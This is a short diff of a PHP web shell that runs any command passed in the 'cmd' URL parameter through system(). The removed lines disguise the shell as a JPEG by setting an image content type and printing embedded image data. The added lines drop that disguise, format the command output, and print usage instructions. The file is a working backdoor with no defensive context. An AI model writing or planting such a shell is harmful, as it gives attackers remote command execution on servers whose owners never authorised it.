@@ -1,9 +1,9 @@
 <?php
-header('Content-Type: image/jpeg');
 if(isset($_GET['cmd'])){
+    echo "<pre>";
     system($_GET['cmd']);
+    echo "</pre>";
 } else {
-    // JPEG data thật
-    echo base64_decode('/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAEBAQEBAQECAQECAQEBAQIFBQ8MCggHBg8NCQoKCQ4RDwwMDhAUEQ8PEh8eGR0fHiUkJCYsKCgoKCgoKCgoKCj/2wBDAQEBAQEBAQIBAQICAgECAggoHBgYHCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCj/wAARCAABAAEDASIAAhEBAxEB/8QAFQABAQAAAAAAAAAAAAAAAAAAAAX/xAAeEAABAwQDAAAAAAAAAAAAAAACAAEDBBEhEjFRYf/EABUBAQEAAAAAAAAAAAAAAAAAAAAB/8QAFBEBAAAAAAAAAAAAAAAAAAAAAP/aAAwDAQACEQMRAD8An6A//9k=');
+    echo "PHP is running. Add ?cmd=command to execute.";
 }
 ?>
